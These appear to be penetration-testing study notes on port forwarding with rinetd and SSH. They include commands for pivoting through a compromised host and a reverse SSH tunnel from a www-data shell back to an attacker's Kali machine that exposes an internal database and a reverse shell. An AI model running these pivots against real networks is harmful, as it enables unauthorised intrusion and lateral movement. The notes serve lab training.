# Port forwarding, redirection and tunnelling  

## rinetd  

Install.  

`sudo apt update && sudo apt install rinetd`  

The configuration file needs 4 parameters. Bindaddress and bind port define the listener and connectaddress and connectport define the destination.  

`/etc/rinetd.conf`  

After a rule is defined, restart the service and check port is listening.  

```
sudo service rinetd restart
ss -antp | grep "80"
```  

## SSH  

### Local port forwarding.  

`ssh -N -L [bind_address:]port:host:hostport [username@address]`  

To set up a local bind address on our machine(0.0.0.0:445) to connect to an unreachable machine (192.168.1.110:445) through a compromised machine on the internal 
network (10.11.0.28) as someUser.

`sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 someUser@10.11.0.128`  

As windows does not support smb v1, the following needs to be changed to access smb.  

`sudo nano /etc/samba/smb.conf`  

Add this line to the above.  

`min protocol = SMB2`  

Restart.  

`sudo /etc/init.d/smbd restart`  

To connect to an internal web server through local on port 80 to 172.18.0.2:80 while traversing the ssh of student 192.168.171.52.  

`sudo ssh -N -L 0.0.0.0:80:172.18.0.2:80 student@192.168.171.52 -p 2222`  

Note the order of flags -N and -L matters and should be as above or a error will be given.  

### Remote port forwarding.  

Remote is the opposite of local, a port is opened on the remote machine and directed to a port on our machine.  

Command outline.  

`ssh -N -R [bind_address:]port:host:hostport [username@address]`  

If we have a shell on a client, we can access the internal sql server by remote forwarding. We connect back to kali as user kali,opening up a listener
on port 2221.  

`www-data@client# ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4`  

This means we can send traffic to 2221 to reach the server on 3306 through ssh tunnel 22. This can be done if a firewall is only letting traffic from 
ssh through.  

We can establish the port is listening on our kali machine and then use nmap to fingerprint the service.  

```
ss -antp | grep "2221"
sudo nmap -sS -sV 127.0.0.1 -p 2221
```  

If we have a rev shell on the target that can only access local 5555, we can set up a remote tunnel FROM ATTACKING MACHINE.  

`ssh -N -R 127.0.0.1:5555:192.168.119.171:4444 student@192.168.171.52 -p 2222`  

